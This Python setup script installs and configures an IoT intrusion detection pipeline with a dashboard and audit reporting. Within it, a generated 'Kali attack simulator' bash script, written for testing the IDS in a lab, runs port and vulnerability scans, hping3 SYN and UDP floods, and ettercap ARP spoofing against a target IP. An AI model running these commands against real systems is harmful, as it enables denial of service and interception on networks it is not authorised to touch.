#!/usr/bin/env python3
"""
Setup script for IoT IDS Pipeline
Configures the environment and starts the system
"""

import os
import sys
import subprocess
import json
from pathlib import Path

def install_requirements():
    """Install required packages"""
    print("📦 Installing required packages...")
    try:
        subprocess.check_call([sys.executable, "-m", "pip", "install", "-r", "requirements.txt"])
        print("✅ Requirements installed successfully")
    except subprocess.CalledProcessError as e:
        print(f"❌ Failed to install requirements: {e}")
        return False
    return True

def create_config():
    """Create configuration file"""
    config = {
        "model_path": "iot_ids_lightgbm_latest.pkl",
        "network_interface": "eth0",
        "dashboard_host": "0.0.0.0",
        "dashboard_port": 5000,
        "log_level": "INFO",
        "blockchain_enabled": True,
        "alert_threshold": 0.7,
        "monitoring_enabled": True
    }
    
    config_path = "ids_config.json"
    with open(config_path, 'w') as f:
        json.dump(config, f, indent=4)
    
    print(f"📝 Configuration file created: {config_path}")
    return config_path

def check_permissions():
    """Check if running with sufficient permissions for packet capture"""
    if os.geteuid() != 0:
        print("⚠️  Warning: Not running as root. Packet capture may not work.")
        print("   Run with: sudo python3 setup_ids_pipeline.py")
        return False
    return True

def setup_directories():
    """Create necessary directories"""
    directories = ["logs", "models", "reports", "blockchain_data"]
    
    for directory in directories:
        Path(directory).mkdir(exist_ok=True)
        print(f"📁 Created directory: {directory}")

def create_startup_script():
    """Create startup script"""
    startup_script = """#!/bin/bash
# IoT IDS Pipeline Startup Script

echo "🔒 Starting IoT IDS Pipeline..."

# Check if model file exists
if [ ! -f "iot_ids_lightgbm_latest.pkl" ]; then
    echo "❌ Model file not found: iot_ids_lightgbm_latest.pkl"
    echo "Please place your trained model file in this directory"
    exit 1
fi

# Check network interface
INTERFACE="eth0"
if ! ip link show $INTERFACE > /dev/null 2>&1; then
    echo "⚠️  Network interface $INTERFACE not found"
    echo "Available interfaces:"
    ip link show | grep -E "^[0-9]+:" | cut -d: -f2 | tr -d ' '
    echo "Please update the interface in realtime_ids_pipeline.py"
fi

# Start the pipeline
echo "🚀 Starting IoT IDS Pipeline..."
python3 realtime_ids_pipeline.py

echo "Pipeline stopped."
"""
    
    with open("start_ids.sh", 'w') as f:
        f.write(startup_script)
    
    os.chmod("start_ids.sh", 0o755)
    print("📜 Startup script created: start_ids.sh")

def create_kali_attack_simulator():
    """Create attack simulation script for Kali VM"""
    attack_script = """#!/bin/bash
# Kali VM Attack Simulation Script
# Run this from your Kali VM to test the IDS

TARGET_IP="192.168.1.100"  # Update with your IDS system IP

echo "🎯 IoT IDS Attack Simulation"
echo "Target: $TARGET_IP"
echo "=========================="

# 1. Port Scan (Reconnaissance)
echo "1. 🔍 Port Scanning..."
nmap -sS -O $TARGET_IP

# 2. SYN Flood (DoS Attack)
echo "2. 💥 SYN Flood Attack..."
hping3 -S -p 80 --flood $TARGET_IP &
FLOOD_PID=$!
sleep 10
kill $FLOOD_PID

# 3. UDP Flood
echo "3. 🌊 UDP Flood Attack..."
hping3 --udp -p 53 --flood $TARGET_IP &
FLOOD_PID=$!
sleep 10
kill $FLOOD_PID

# 4. ARP Spoofing
echo "4. 🎭 ARP Spoofing..."
ettercap -T -M arp:remote /$TARGET_IP// &
ETTERCAP_PID=$!
sleep 15
kill $ETTERCAP_PID

# 5. Vulnerability Scan
echo "5. 🔎 Vulnerability Scanning..."
nmap -sV --script vuln $TARGET_IP

# 6. Mirai-style Botnet Simulation
echo "6. 🤖 Botnet Simulation..."
for i in {1..100}; do
    curl -s http://$TARGET_IP:80 > /dev/null &
done
sleep 5

echo "✅ Attack simulation completed!"
echo "Check your IDS dashboard for detected attacks."
"""
    
    with open("kali_attack_simulator.sh", 'w') as f:
        f.write(attack_script)
    
    os.chmod("kali_attack_simulator.sh", 0o755)
    print("⚔️  Kali attack simulator created: kali_attack_simulator.sh")

def create_audit_report_generator():
    """Create audit report generator"""
    report_script = """#!/usr/bin/env python3
'''
IoT IDS Audit Report Generator
Generates comprehensive security reports
'''

import json
import sqlite3
from datetime import datetime, timedelta
import pandas as pd
import matplotlib.pyplot as plt
import seaborn as sns

class AuditReportGenerator:
    def __init__(self, blockchain_file="blockchain_data/audit.json"):
        self.blockchain_file = blockchain_file
        
    def generate_report(self, days=7):
        '''Generate comprehensive audit report'''
        print(f"📊 Generating {days}-day audit report...")
        
        # Load blockchain data
        attacks = self.load_attack_data(days)
        
        # Generate report
        report = {
            'report_date': datetime.now().isoformat(),
            'period_days': days,
            'total_attacks': len(attacks),
            'attack_types': self.analyze_attack_types(attacks),
            'threat_levels': self.analyze_threat_levels(attacks),
            'source_ips': self.analyze_source_ips(attacks),
            'timeline': self.analyze_timeline(attacks),
            'recommendations': self.generate_recommendations(attacks)
        }
        
        # Save report
        report_file = f"reports/audit_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=4)
        
        print(f"✅ Audit report saved: {report_file}")
        return report_file
    
    def load_attack_data(self, days):
        '''Load attack data from blockchain'''
        # Placeholder - implement based on your blockchain structure
        return []
    
    def analyze_attack_types(self, attacks):
        '''Analyze attack type distribution'''
        return {}
    
    def analyze_threat_levels(self, attacks):
        '''Analyze threat level distribution'''
        return {}
    
    def analyze_source_ips(self, attacks):
        '''Analyze source IP patterns'''
        return {}
    
    def analyze_timeline(self, attacks):
        '''Analyze attack timeline'''
        return {}
    
    def generate_recommendations(self, attacks):
        '''Generate security recommendations'''
        recommendations = [
            "Implement rate limiting for high-frequency sources",
            "Update firewall rules to block malicious IPs",
            "Monitor for recurring attack patterns",
            "Consider implementing additional DDoS protection"
        ]
        return recommendations

if __name__ == "__main__":
    generator = AuditReportGenerator()
    generator.generate_report(7)
"""
    
    with open("audit_report_generator.py", 'w') as f:
        f.write(report_script)
    
    print("📋 Audit report generator created: audit_report_generator.py")

def main():
    """Main setup function"""
    print("🔒 IoT IDS Pipeline Setup")
    print("=" * 30)
    
    # Check permissions
    check_permissions()
    
    # Create directories
    setup_directories()
    
    # Install requirements
    if not install_requirements():
        print("❌ Setup failed due to requirements installation error")
        return
    
    # Create configuration
    create_config()
    
    # Create scripts
    create_startup_script()
    create_kali_attack_simulator()
    create_audit_report_generator()
    
    print("\n🎉 Setup completed successfully!")
    print("\n📋 Next steps:")
    print("1. Place your trained model file (iot_ids_lightgbm_latest.pkl) in this directory")
    print("2. Update network interface in realtime_ids_pipeline.py if needed")
    print("3. Run: sudo ./start_ids.sh")
    print("4. Access dashboard at: http://localhost:5000")
    print("5. Use kali_attack_simulator.sh from your Kali VM to test")
    
    print("\n📁 Files created:")
    files = [
        "requirements.txt",
        "ids_config.json", 
        "start_ids.sh",
        "kali_attack_simulator.sh",
        "audit_report_generator.py",
        "realtime_ids_pipeline.py",
        "templates/dashboard.html"
    ]
    for file in files:
        if os.path.exists(file):
            print(f"  ✅ {file}")
        else:
            print(f"  ❌ {file}")

if __name__ == "__main__":
    main()
